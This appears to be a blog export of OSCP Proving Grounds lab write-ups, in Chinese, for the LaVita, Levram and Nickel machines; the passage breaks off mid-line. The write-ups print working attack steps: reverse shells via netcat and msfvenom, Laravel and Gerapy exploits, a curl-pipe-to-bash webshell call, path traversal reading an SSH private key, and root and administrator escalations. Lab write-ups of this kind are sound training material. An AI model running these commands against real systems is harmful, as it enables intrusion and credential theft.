        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - LaVita</title>
    <url>/post/20250217003515.html</url>
    <content><![CDATA[<h1 id="Diffculty"><a href="#Diffculty" class="headerlink" title="Diffculty"></a>Diffculty</h1><p>medium</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[*] ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.4</span>p1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">80.</span></span><br><span class="line">     Apache/<span class="number">2.4</span><span class="number">.56</span> (Debian)</span><br></pre></td></tr></table></figure>

<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-68.png.png"></p>
<p>点击demo进入demo登录页面</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-70.png.png"></p>
<p>注册一个账号admin:adminadmin， 登录进入后可以上传文件，上传图片后，展示在下方ImageList列表中，点击链接可以查看，尝试把php webshell改成png后台，无法上传成功，同时发现下面的imglist变空了，刚开始以为是上传了恶意文件之后，会自动把所有文件删除，实际上是有定时任务每隔一分钟清除images文件夹下的所有图片。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-66.png.png"></p>
<p>刷新之前上传的图片页面， 404， 可以看到CMS： Laravel 8.4.0</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-67.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>searchsploit 搜索 laravel, 发现8.4.2 debug mode下有rce漏洞，先开启debug mode, 开启之后未ENABLED状态，但是代码利用不成功</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-69.png.png"></p>
<p>根据github链接, cve编号是 CVE-2021-3129, 找到 <a href="https://github.com/0x0d3ad/CVE-2021-3129">https://github.com/0x0d3ad/CVE-2021-3129</a></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-72.png.png"></p>
<p>克隆执行利用代码，成功拿到反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">└─$ python CVE-<span class="number">2021</span>-<span class="number">3129.</span>py http://<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span> --cmd <span class="string">&quot;nc 192.168.45.234 4444 -e /bin/bash&quot;</span></span><br><span class="line">[+] Generating PHAR payload <span class="keyword">for</span> command: nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span> <span class="number">4444</span> -e /<span class="built_in">bin</span>/bash</span><br><span class="line">[+] Trying to clear logs</span><br><span class="line">[+] Logs cleared</span><br><span class="line">[+] Convert log file to PHAR</span><br><span class="line">[+] Successfully converted logs to PHAR</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span>] <span class="number">56074</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure>

<p>上传linpeas执行，发现用户除了roo外还有skunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Users <span class="keyword">with</span> console</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash</span><br><span class="line">skunk:x:<span class="number">1001</span>:<span class="number">1001</span>::/home/skunk:/<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<p>发现mysql 凭证</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-73.png.png"></p>
<p>连接mysql, 但是表里都是空的， 只有users中有一个刚刚注册的admin账号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql -ulavita -Dlavita -psdfquelw0kly9jgbx92</span><br><span class="line">MariaDB [lavita]&gt; show tables</span><br><span class="line">show tables;</span><br><span class="line">+------------------+</span><br><span class="line">| Tables_in_lavita |</span><br><span class="line">+------------------+</span><br><span class="line">| failed_jobs      |</span><br><span class="line">| migrations       |</span><br><span class="line">| password_resets  |</span><br><span class="line">| sessions         |</span><br><span class="line">| users            |</span><br><span class="line">+------------------+</span><br><span class="line"><span class="number">5</span> rows <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure>

<h1 id="foothold2"><a href="#foothold2" class="headerlink" title="foothold2"></a>foothold2</h1><p>上传pspy执行收集定时任务，发现UID&#x3D;1001定期清理图片文件</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-71.png.png"></p>
<p>文件aetisan所属用户是当前用户，直接 <code>msfvenom -p php/reverse_php LHOST=192.168.45.234 LPORT=80 -f raw -o test.php</code> 生成反弹shell文件，上传后覆盖artisan文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ls -al artisan</span><br><span class="line">-rwxr-xr-x <span class="number">1</span> www-data www-data <span class="number">1885</span> Feb <span class="number">16</span> <span class="number">10</span>:<span class="number">26</span> artisan</span><br></pre></td></tr></table></figure>

<p>稍等片刻，得到skunk的shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span>] <span class="number">55570</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1001</span>(skunk) gid=<span class="number">1001</span>(skunk) groups=<span class="number">1001</span>(skunk),<span class="number">27</span>(sudo),<span class="number">33</span>(www-data)</span><br><span class="line">whoami</span><br><span class="line">skunk</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span>] <span class="number">54526</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1001</span>(skunk) gid=<span class="number">1001</span>(skunk) groups=<span class="number">1001</span>(skunk),<span class="number">27</span>(sudo),<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>skunk可以在不需要密码的情况下执行composer， 在<a href="https://gtfobins.github.io/gtfobins/composer/%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96shell">https://gtfobins.github.io/gtfobins/composer/找到利用方法，成功获取shell</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> skunk on debian:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User skunk may run the following commands on debian:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">bin</span>/composer --working-<span class="built_in">dir</span>\=/var/www/html/lavita *</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;/var/www/html/lavita/composer.json</span><br><span class="line">sudo composer --working-dir\=/var/www/html/lavita * run-script x</span><br></pre></td></tr></table></figure>

<p>小插曲： 测试发现php&#x2F;reverse_php生成的反弹shell文件是无法升级成交互式shell的，看了下payload说明，reverse_php确实没有说是interactive, which perl 查一下机器上perl用 reverse_perl <code>msfvenom -p php/reverse_perl LHOST=192.168.45.234 LPORT=80 -f raw -o test.php</code>重新生成payload文件，覆盖aetisan, 新获得的shell可以通过 <code>python -c &#39;import pty; pty.spawn(*/bin/bash&quot;)&#39;</code>升级成交互式shell, composer提权过程需要手动敲一下回车，切换为交互式shell之后才成功。</p>
<p>服务器没有perl怎么办？</p>
<p>可以上传webshell， 通过cmd执行反弹shell shell脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.109.128/webshell.php&amp;cmd=curl%20192.168.118.4/shell.sh%20|%20bash</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Levram</title>
    <url>/post/20250215225233.html</url>
    <content><![CDATA[<h1 id="Difficulty：-easy"><a href="#Difficulty：-easy" class="headerlink" title="Difficulty： easy"></a>Difficulty： easy</h1><h1 id="scans"><a href="#scans" class="headerlink" title="scans"></a>scans</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.9</span>p1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http-alt found on tcp/<span class="number">8000.</span></span><br><span class="line">    WSGIServer/<span class="number">0.2</span> CPython/<span class="number">3.10</span><span class="number">.6</span></span><br><span class="line">    SilverStream</span><br><span class="line">    Title<span class="punctuation">:</span> Gerapy</span><br></pre></td></tr></table></figure>

<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>8000 gerapy</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-82.png.png"></p>
<p>弱密码admin:admin登录</p>
<p>底部发现版本号</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-78.png.png"></p>
<h2 id="seachspolit"><a href="#seachspolit" class="headerlink" title="seachspolit"></a>seachspolit</h2><p><code>searchsploit gerapy</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-81.png.png"></p>
<p>完全符合，执行后报错，查看利用代码，获取projects时返回数据为空, 新建一个test project,重新执行，成功反弹shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">50640.</span>py -t <span class="number">192.168</span><span class="number">.212</span><span class="number">.24</span> -p <span class="number">8000</span> -L <span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span> -P <span class="number">80</span></span><br><span class="line">  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____</span><br><span class="line"> / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |</span><br><span class="line">| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /</span><br><span class="line">| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /</span><br><span class="line"> \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____<span class="comment">//_/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit for CVE<span class="number">-2021</span><span class="number">-43857</span></span><br><span class="line">For<span class="punctuation">:</span> Gerapy &lt; <span class="number">0.9</span><span class="number">.8</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Resolving URL...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Logging in to application...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Login successful! Proceeding...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Getting the project list</span><br><span class="line">Traceback (most recent call last)<span class="punctuation">:</span></span><br><span class="line">  File <span class="string">&quot;/home/kali/Tools/pg/Levarm/50640.py&quot;</span><span class="punctuation">,</span> line <span class="number">130</span><span class="punctuation">,</span> in &lt;module&gt;</span><br><span class="line">    exp.exploitation()</span><br><span class="line">  File <span class="string">&quot;/home/kali/Tools/pg/Levarm/50640.py&quot;</span><span class="punctuation">,</span> line <span class="number">76</span><span class="punctuation">,</span> in exploitation</span><br><span class="line">    name = dict3<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span><span class="punctuation">[</span>&#x27;name&#x27;<span class="punctuation">]</span></span><br><span class="line">           ~~~~~^^^</span><br><span class="line">IndexError<span class="punctuation">:</span> list index out of range</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-80.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">50640.</span>py -t <span class="number">192.168</span><span class="number">.212</span><span class="number">.24</span> -p <span class="number">8000</span> -L <span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span> -P <span class="number">80</span></span><br><span class="line">  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____</span><br><span class="line"> / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |</span><br><span class="line">| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /</span><br><span class="line">| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /</span><br><span class="line"> \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____<span class="comment">//_/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit for CVE<span class="number">-2021</span><span class="number">-43857</span></span><br><span class="line">For<span class="punctuation">:</span> Gerapy &lt; <span class="number">0.9</span><span class="number">.8</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Resolving URL...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Logging in to application...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Login successful! Proceeding...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Getting the project list</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Found project<span class="punctuation">:</span> test</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Getting the ID of the project to build the URL</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Found ID of the project<span class="punctuation">:</span>  <span class="number">1</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Setting up a netcat listener</span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">80</span> ...</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Executing reverse shell payload</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Watchout for shell! <span class="punctuation">:</span>)</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.24</span><span class="punctuation">]</span> <span class="number">44652</span></span><br><span class="line">bash<span class="punctuation">:</span> cannot set terminal process group (<span class="number">846</span>)<span class="punctuation">:</span> Inappropriate ioctl for device</span><br><span class="line">bash<span class="punctuation">:</span> no job control in this shell</span><br><span class="line">app@ubuntu<span class="punctuation">:</span>~/gerapy$ id</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">1000</span>(app) gid=<span class="number">1000</span>(app) groups=<span class="number">1000</span>(app)</span><br></pre></td></tr></table></figure>

<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>下载linpeas, 发现python3 cap_setuid 权限， 执行 <code>python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</code>提权</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
</blockquote>
<p><img data-src="https://thiiiiink.com/202508/asynccode-79.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os; os.setuid(<span class="number">0</span>); os.system(<span class="string">&quot;/bin/sh&quot;</span>)&#x27;</span><br><span class="line"># id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1000</span>(app) groups=<span class="number">1000</span>(app)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Nickel</title>
    <url>/post/20250228015654.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Medium</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">OS: Windows <span class="number">10</span>, Windows Server <span class="number">2019</span>, Windows Server <span class="number">2016</span></span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;2004&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;19041&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ssh found on tcp/<span class="number">22</span>.</span><br><span class="line">     Bitvise WinSSHD <span class="number">8.48</span> (FlowSsh <span class="number">8.48</span>; protocol <span class="number">2.0</span>; non<span class="literal">-commercial</span> use)</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">135</span>.</span><br><span class="line"></span><br><span class="line">[*] netbios<span class="literal">-ssn</span> found on tcp/<span class="number">139</span>.</span><br><span class="line"></span><br><span class="line">[*] microsoft<span class="literal">-ds</span> found on tcp/<span class="number">445</span>.</span><br><span class="line">    SMB <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line">[*] http<span class="literal">-proxy</span> found on tcp/<span class="number">8080</span>.</span><br><span class="line">    &lt;meta name=<span class="string">&quot;GENERATOR&quot;</span> content=<span class="string">&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;</span>&gt;</span><br><span class="line">        About the program:</span><br><span class="line"> </span><br><span class="line">    Argus Surveillance DVR</span><br><span class="line">    Program is UNREGISTERED</span><br><span class="line">    Version: <span class="number">4.0</span></span><br><span class="line">    Released <span class="number">18</span>/<span class="number">12</span>/<span class="number">2008</span></span><br><span class="line">    Argus Surveillance Inc.</span><br><span class="line"></span><br><span class="line">    http<span class="literal">-vuln-cve2011-3368</span>:</span><br><span class="line">    CVE:CVE<span class="literal">-2005-3299</span>  phpmyadmin</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">5040</span>.</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49664</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49665</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49666</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49667</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49668</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49669</span>.</span><br></pre></td></tr></table></figure>

<h1 id="22-WinSSHD"><a href="#22-WinSSHD" class="headerlink" title="22 WinSSHD"></a>22 WinSSHD</h1><p>windows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件</p>
<p>8.48版本没有搜索到可利用的已知漏洞</p>
<h2 id="445-SMB"><a href="#445-SMB" class="headerlink" title="445 SMB"></a>445 SMB</h2><p>无法匿名登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">smbclient <span class="literal">-L</span> //<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-N</span></span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<h2 id="8080-Argus-Surveillance-DVR"><a href="#8080-Argus-Surveillance-DVR" class="headerlink" title="8080 Argus Surveillance DVR"></a>8080 Argus Surveillance DVR</h2><p>进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-107.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-106.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-105.png.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> </span><br><span class="line">viewer@<span class="number">192.168</span>.<span class="number">140.179</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">viewer@192.168.140.179&#x27;</span>s password: </span><br><span class="line">                                      </span><br></pre></td></tr></table></figure>

<p>searchSploit搜一下已知漏洞，全部复制过来看看说明</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-110.png.png"></p>
<p>50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法</p>
<p>50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-113.png.png"></p>
<p>45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;</span></span><br><span class="line">; <span class="keyword">for</span> <span class="number">16</span><span class="literal">-bit</span> app support</span><br><span class="line">[<span class="number">386</span><span class="type">Enh</span>]</span><br><span class="line">woafont=dosapp.fon</span><br><span class="line">EGA80WOA.FON=EGA80WOA.FON</span><br><span class="line">EGA40WOA.FON=EGA40WOA.FON</span><br><span class="line">CGA80WOA.FON=CGA80WOA.FON</span><br><span class="line">CGA40WOA.FON=CGA40WOA.FON</span><br><span class="line"></span><br><span class="line">[<span class="type">drivers</span>]</span><br><span class="line">wave=mmdrv.dll</span><br><span class="line">timer=timer.drv</span><br><span class="line"></span><br><span class="line">[<span class="type">mci</span>]</span><br></pre></td></tr></table></figure>

<p>45312 提权： 在Argus 应用文件夹下放一个恶意 <code>gsm_codec.dll</code>,这个dll会被以SYSTEM账号执行</p>
<h1 id="FootHold"><a href="#FootHold" class="headerlink" title="FootHold"></a>FootHold</h1><p>4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、<code>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini</code> 配置信息。</p>
<ol>
<li>成功读到了viewer账号的私钥</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn=  Ok  &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt;                                                                                                                                               </span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line"><span class="literal">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="literal">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J</span><br><span class="line">Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP</span><br><span class="line">iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx</span><br><span class="line">pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS</span><br></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-i</span> viewer.id_rsa</span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\viewer&gt;whoami</span><br><span class="line">dvr4\viewer</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>读配置文件, 没有和用户密码相关的信息</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;</span></span><br><span class="line">[<span class="type">Main</span>]</span><br><span class="line">ServerName=</span><br><span class="line">ServerLocation=</span><br><span class="line">ServerDescription=</span><br><span class="line">ReadH=<span class="number">0</span></span><br><span class="line">UseDialUp=<span class="number">0</span></span><br><span class="line">DialUpConName=</span><br><span class="line">DialUpDisconnectWhenDone=<span class="number">0</span></span><br><span class="line">DIALUPUSEDEFAULTS<span class="string">&quot; checked checked</span></span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><h3 id="SeShutdownPrivilege"><a href="#SeShutdownPrivilege" class="headerlink" title="SeShutdownPrivilege"></a>SeShutdownPrivilege</h3><p>查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 <code>C:\freezeScript\win10.ps1</code>, 运行时间是靶机启动时间</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-112.png.png"></p>
<p>查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State  </span><br><span class="line">============================= ==================================== =======</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled</span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>       Enabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Enabled</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">md</span> freezeScript</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">36</span> AM                freezeScript                                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> .\freezeScript\</span><br><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt;  <span class="string">&#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;</span>| <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\freezeScript\win10.ps1&quot;</span></span><br><span class="line"><span 